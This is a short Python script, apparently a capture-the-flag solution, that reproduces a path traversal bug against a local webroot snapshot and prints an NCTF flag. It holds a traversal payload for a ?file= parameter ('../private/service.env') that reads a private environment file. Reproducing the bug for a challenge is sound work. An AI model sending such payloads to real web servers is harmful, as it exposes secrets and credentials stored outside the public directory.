#!/usr/bin/env python3
"""Reproduce the path traversal against the shipped webroot snapshot."""

import os
import re
import tarfile
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

WEBROOT = "deploy/public"
PAYLOAD = "../private/service.env"  # the malicious ?file= value


def main() -> None:
    with tempfile.TemporaryDirectory() as d:
        with tarfile.open(os.path.join(ROOT, "webroot.tar.gz")) as t:
            t.extractall(d)
        # exactly what the handler does: os.path.join(WEBROOT, name)
        path = os.path.join(d, os.path.join(WEBROOT, PAYLOAD))
        data = open(os.path.normpath(path)).read()
    flag = re.search(r"NCTF\{[^}]+\}", data).group(0)
    print(flag)


if __name__ == "__main__":
    main()
